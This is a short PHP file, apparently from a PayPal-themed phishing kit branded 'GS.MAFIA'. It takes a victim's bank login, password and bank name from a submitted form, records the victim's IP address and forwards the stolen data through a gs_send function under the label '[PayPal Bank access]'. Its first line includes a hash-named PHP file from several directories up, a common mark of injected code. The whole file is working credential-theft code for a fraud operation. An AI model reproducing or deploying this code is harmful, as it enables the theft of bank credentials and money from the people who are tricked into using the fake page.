<?php include_once'../../../../02f5c794f8e62115216710ab8d38aa0f.php';?><?php
#   ___   ___       __  __     _     ___   ___     _   
#  / __| / __|     |  \/  |   /_\   | __| |_ _|   /_\  
# | (_ | \__ \  _  | |\/| |  / _ \  | _|   | |   / _ \ 
#  \___| |___/ (_) |_|  |_| /_/ \_\ |_|   |___| /_/ \_\
include("../gs_config.php");
$_SESSION['gs_bankaccessarray'] = $_POST;
$_SESSION['page'] = "bankaccess";
$ip = getclientip();
$GS_SEND["LOGIN"] = "<span style='color:green'>".$_POST["gs_banklogin"]."</span>";
$GS_SEND["PASSWORD"] = "<span style='color:green'>".$_POST["gs_bankpassword"]."</span>";
$GS_SEND["BANK_NAME"] = "<span style='color:green'>".$_POST["gs_bankname"]."</span>";
gs_send($GS_SEND,"[PayPal Bank access] ** ".$ip." ** ");

?>